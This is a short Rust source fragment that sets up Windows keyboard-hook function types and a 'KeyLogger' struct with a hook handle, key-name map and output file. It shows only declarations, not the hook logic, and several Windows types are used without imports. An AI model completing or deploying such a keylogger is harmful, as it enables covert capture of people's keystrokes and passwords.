use core::ffi::c_int;
use std::collections::HashMap;

pub type HookCallback = extern "system" fn(c_int, WPARAM, LPARAM) -> LRESULT;
pub type SetWindowsHookExWType = unsafe extern "system" fn(c_int, Option<HookCallback>, HHOOK, c_int) -> HHOOK;
pub type CallNextHookExType = unsafe extern "system" fn(HHOOK, c_int, WPARAM, LPARAM) -> LRESULT;
pub type MessageBoxWType = unsafe extern "system" fn(*mut std::ffi::c_void, LPCWSTR, LPCWSTR, u32) -> c_int;

pub struct KeyLogger {
    pub hook: HHOOK,
    pub format: u32,
    pub key_name: HashMap<i32, &'static str>,
    pub output_file: std::fs::File,

}
pub struct KBDLLHOOKSTRUCT {
    pub vk_code: i32,
}
